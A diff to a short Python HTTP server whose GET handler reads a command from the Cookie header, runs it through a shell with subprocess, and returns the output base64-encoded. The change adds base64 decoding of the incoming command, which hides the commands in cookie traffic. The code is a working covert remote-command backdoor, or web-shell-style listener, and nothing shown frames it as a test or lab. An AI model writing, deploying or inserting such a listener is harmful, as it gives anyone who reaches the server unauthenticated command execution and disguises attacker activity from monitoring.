@@ -1,6 +1,6 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import subprocess
-from base64 import b64encode
+from base64 import b64encode, b64decode
 import argparse
 
 parser = argparse.ArgumentParser()
@@ -15,7 +15,8 @@ class serve(BaseHTTPRequestHandler):
     
     def do_GET(self):          
         if self.path != '/favicon.ico':
-            command = self.headers['Cookie'].split('=')[-1]
+            encoded_command = self.headers['Cookie'].split('=')[-1]
+            command = b64decode(encoded_command.encode()).decode()
             output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()[0]
             encoded_output = b64encode(bytes(output)).decode()
             self.send_response(200)
